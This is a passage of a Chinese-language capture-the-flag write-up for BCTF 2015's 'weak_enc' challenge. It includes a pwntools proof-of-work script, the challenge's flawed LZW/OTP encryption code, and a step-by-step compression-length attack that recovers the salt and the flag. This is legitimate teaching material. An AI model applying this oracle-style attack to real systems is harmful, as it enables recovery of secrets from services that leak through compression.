+<p>Please provide your proof of work, a sha1 sum ending in 16 bit’s set to 0, it must be of length 21 bytes, starting with uT0CQlFV7A/uO/+b</p>
+</blockquote>
+<p>先得过这个才能用的加密系统，然后，写出py：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'146.148.79.13'</span>, <span class="number">8888</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_hash</span><span class="params">(hsh)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (hsh[<span class="number">-2</span>] == <span class="string">'\x00'</span> <span class="keyword">and</span> hsh[<span class="number">-1</span>] == <span class="string">'\x00'</span>):</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_connection</span><span class="params">()</span>:</span></span><br><span class="line">    hello = p.recv()</span><br><span class="line">    <span class="keyword">print</span> hello</span><br><span class="line">    pre = hello[<span class="number">-17</span>:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">print</span> pre</span><br><span class="line">    test = pre + os.urandom(<span class="number">5</span>)</span><br><span class="line">    ha = hashlib.sha1()</span><br><span class="line">    ha.update(test)</span><br><span class="line">    <span class="keyword">while</span> (get_hash(ha.digest()) == <span class="keyword">False</span>):</span><br><span class="line">        test = pre + os.urandom(<span class="number">5</span>)</span><br><span class="line">        ha = hashlib.sha1()</span><br><span class="line">        ha.update(test)</span><br><span class="line">    <span class="keyword">print</span> ha.digest()</span><br><span class="line">    <span class="keyword">print</span> test</span><br><span class="line">    p.send(test)</span><br><span class="line">    <span class="keyword">print</span> p.recv()</span><br><span class="line">    p.interactive()</span><br><span class="line">init_connection()</span><br></pre></td></tr></table></figure>
+<p>能使用它的加密系统后，随意输了个a、b，发现返回值是一样的，然后敲了个空格，返回了<code>NxQ1NDMYcDcw53g=</code>，然后去看源码，这段就是S对SALT加密的结果。那，为何输入a和b都是返回一样的呢？看源码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(m)</span>:</span></span><br><span class="line">    lzwDict = dict()</span><br><span class="line">    toEnc = LZW(SALT + m, lzwDict)</span><br><span class="line">    key = hashlib.md5(SALT*<span class="number">2</span>).digest()</span><br><span class="line">    OTPBase = <span class="string">""</span></span><br><span class="line">    OPT = <span class="string">""</span></span><br><span class="line">    step = HASHLENGTH - SMALLPRIME</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">3</span>*N+step, step):</span><br><span class="line">        rand, key = STRONGPseudoRandomGenerator(key)</span><br><span class="line">        OTPBase += rand</span><br><span class="line">    enc = []</span><br><span class="line">    otpadded = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(toEnc)):</span><br><span class="line">        index = i % N</span><br><span class="line">        iRound = i / N + <span class="number">1</span></span><br><span class="line">        OTP = OTPBase[<span class="number">3</span>*int(pow(ord(OTPBase[<span class="number">3</span>*index]),ord(OTPBase[<span class="number">3</span>*index+<span class="number">1</span>])*iRound, N))+<span class="number">2</span>]</span><br><span class="line">        otpadded.append(ord(OTP))</span><br><span class="line">        enc.append(chr(toEnc[i] ^ ord(OTP)))</span><br><span class="line">    <span class="keyword">return</span> b64.b64encode(<span class="string">''</span>.join(enc))</span><br></pre></td></tr></table></figure>
+<p>上面得出OTPBase只与SALT有关，而且得到的返回值的长度只与<code>toEnc</code>的长度有关，就跟过去看看LZW吧：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LZW</span><span class="params">(s, lzwDict)</span>:</span> <span class="comment"># LZW written by NEWBIE</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        updateDict(c, lzwDict)</span><br><span class="line">    <span class="comment"># print lzwDict # have to make sure it works</span></span><br><span class="line">    result = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; len(s):</span><br><span class="line">        <span class="keyword">if</span> s[i:] <span class="keyword">in</span> lzwDict:</span><br><span class="line">            result.append(lzwDict[s[i:]])</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> testEnd <span class="keyword">in</span> range(i+<span class="number">2</span>, len(s)+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> s[i:testEnd] <span class="keyword">in</span> lzwDict:</span><br><span class="line">                updateDict(s[i:testEnd], lzwDict)</span><br><span class="line">                result.append(lzwDict[s[i:testEnd<span class="number">-1</span>]])</span><br><span class="line">                i = testEnd - <span class="number">2</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
+<p>第一个循环将所有单字符加入到lzwDict中，而后，将所有“组合”全部放入lzwDict中，而<code>if s[i:] in lzwDict:</code>会把最后一个加入到lzwDict。如SALT为<code>ab</code>,则我们输入<code>a</code>时，<code>lzwDict</code>中<code>{&#39;a&#39;: 0, &#39;b&#39;: 1, &#39;ab&#39;: 2, &#39;ba&#39;: 3}</code>而<code>toEnc</code>为：<code>[0,1,0]</code>。但是输入<code>c</code>时，<code>lzwDict</code>中<code>{&#39;a&#39;: 0, &#39;c&#39;: 2, &#39;b&#39;: 1, &#39;ab&#39;: 3, &#39;bc&#39;: 4}</code>，toEnc为：<code>[0, 1, 2]</code>。所以出现相同的加密结果能证明输入的字符不在SALT中。于是就可以爆破出SALT中包含的字符有：<code>n,i,k,o</code>。然后通过含有组合则不增加长度的方式继续爆破得到两位的：</p>
+<pre><code>&gt;&gt;&gt; tuple: ni Value: NxQ1NDMYcDcw53ga, len: 12
+&gt;&gt;&gt; tuple: ik Value: NxQ1NDMYcDcw53gb, len: 12
+&gt;&gt;&gt; tuple: ko Value: NxQ1NDMYcDcw53gY, len: 12
+&gt;&gt;&gt; tuple: on Value: NxQ1NDMYcDcw53gZ, len: 12
+</code></pre><p>三位：</p>
+<pre><code>&gt;&gt;&gt; tuple: nin Value: NxQ1NDMYcDcw53gU, len: 12
+&gt;&gt;&gt; tuple: nik Value: NxQ1NDMYcDcw53gW, len: 12
+&gt;&gt;&gt; tuple: iko Value: NxQ1NDMYcDcw53gT, len: 12
+&gt;&gt;&gt; tuple: kon Value: NxQ1NDMYcDcw53gX, len: 12
+&gt;&gt;&gt; tuple: oni Value: NxQ1NDMYcDcw53gS, len: 12
+</code></pre><p>四位：</p>
+<pre><code>&gt;&gt;&gt; tuple: niko Value: NxQ1NDMYcDcw53gV, len: 12
+&gt;&gt;&gt; tuple: onio Value: NxQ1NDMYcDcw53gQ, len: 12
+</code></pre><p>五位的不存在了。然后，需要注意<code>nin</code>和<code>onio</code>，<code>nio</code>、<code>io</code>、<code>in</code>组合是没有出现在二位的组合中的。要包含这些然而又不能出现在二位组合中只能是跳过，所以，<code>nin</code>后肯定接的是<code>ik</code>。所以有一个<code>ninik</code>,在它之前要出现一次<code>ni</code>才能取到nin,<code>ni</code>后跟着的是<code>ko</code>，组合得到<code>nikoninik</code>。<code>nio</code>、<code>io</code>不存在的情况下要实现输入<code>onio</code>出现两次<code>onio</code>，只能是<code>oni</code>出现在最后，即输入<code>onio</code>后出现<code>onionio</code>，而且得是在此之前出现过<code>oni</code>才行。所以得到两串：<code>nikoninik</code>、<code>oni</code>。再来组合<code>niko</code>，第一次<code>niko</code>，出现三个二位，再来一串时<code>nikoniko</code>，出现<code>nik</code>、<code>iko</code>，再接上刚才的<code>nikoninik</code>，得到<code>nikonikonikonink</code>会出现<code>ink</code>。不符合，再减少一个<code>niko</code>，<code>nikonikonink</code>得到</p>
+<pre><code>{&apos;ni&apos;: 4, &apos;nk&apos;: 11, &apos;nik&apos;: 8, &apos;on&apos;: 7, &apos;i&apos;: 1, &apos;k&apos;: 2, &apos;kon&apos;: 9, &apos;ko&apos;: 6, &apos;o&apos;: 3, &apos;n&apos;: 0, &apos;ik&apos;: 5, &apos;nin&apos;: 10}
+</code></pre><p>三位的还有<code>oni</code>和<code>iko</code>没有出现过，要出现<code>niko</code>意味着还得出现一次<code>nik</code>，于是在后面再加一个<code>niko</code>，连接上<code>oni</code>，组成<code>nikonikoninikonikoni</code>,运行出现”NxQ1NDMYcDcw53g=”。所以SALT得到了。</p>
+<p>给的密文是<code>NxQ1NDMYcDcw53gVHzI7</code>，解码后得到长度为15，放进去逆运算得到toEnc为：</p>
+<pre><code>[0, 1, 2, 3, 4, 6, 4, 8, 7, 5, 12, 11, 10, 13, 4]
+</code></pre><p>而没加密文的SALT得到的toEnc为：</p>
+<pre><code>[0, 1, 2, 3, 4, 6, 4, 8, 7, 5, 12]，
+</code></pre><p>再输出没加密文的lzwDict：</p>
+<pre><code>{&apos;ni&apos;: 4, &apos;oni&apos;: 12, &apos;nik&apos;: 8, &apos;on&apos;: 7, &apos;i&apos;: 1, &apos;k&apos;: 2, &apos;kon&apos;: 9, &apos;ko&apos;: 6, &apos;niko&apos;: 11, &apos;o&apos;: 3, &apos;n&apos;: 0, &apos;ik&apos;: 5, &apos;nin&apos;: 10, &apos;iko&apos;: 13}
+</code></pre><p>发现，flag似乎也是<code>niko</code>中的。后面四位中有出现<code>niko</code>、<code>nin</code>、<code>iko</code>、<code>ni</code>组合。看了看，发现，这几个组起来刚好符合要求<code>nikoninikoni</code>，<code>niko</code>以前出现过，添加<code>nikon</code>到dic，下标指向下一个<code>n</code>，<code>nin</code>出现过，添加<code>nini</code>，下标指向下一个<code>i</code>，继续添加<code>ikon</code>到<code>dic</code>，然后最后三个为<code>oni</code>。</p>
+<p>于是flag就是：<code>nikoninikoni</code>。</p>
+<p>flag: <code>nikoninikoni</code></p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Team-0xFA"><span class="toc-number">1.</span> <span class="toc-text">Team: 0xFA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#checkin-10pt"><span class="toc-number"></span> <span class="toc-text">checkin (10pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#warmup-50pt"><span class="toc-number"></span> <span class="toc-text">warmup (50pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#torrent-lover-233pt"><span class="toc-number"></span> <span class="toc-text">torrent_lover (233pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#experiment-300pt"><span class="toc-number"></span> <span class="toc-text">experiment (300pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-engine-200pt"><span class="toc-number"></span> <span class="toc-text">sqli_engine (200pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#webchat-325pt"><span class="toc-number"></span> <span class="toc-text">webchat (325pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#weak-enc-200pt"><span class="toc-number"></span> <span class="toc-text">weak_enc (200pt)</span></a>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2015/03/23/bctf2015-writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2015/03/23/bctf2015-writeup/&text=BCTF2015 Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2015/03/23/bctf2015-writeup/&title=BCTF2015 Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2015/03/23/bctf2015-writeup/&is_video=false&description=BCTF2015 Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BCTF2015 Writeup&body=Check out this article: http://rickgray.me/2015/03/23/bctf2015-writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2015/03/23/bctf2015-writeup/&title=BCTF2015 Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2015/03/23/bctf2015-writeup/&title=BCTF2015 Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2015/03/23/bctf2015-writeup/&title=BCTF2015 Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2015/03/23/bctf2015-writeup/&title=BCTF2015 Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2015/03/23/bctf2015-writeup/&name=BCTF2015 Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 RickGray
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
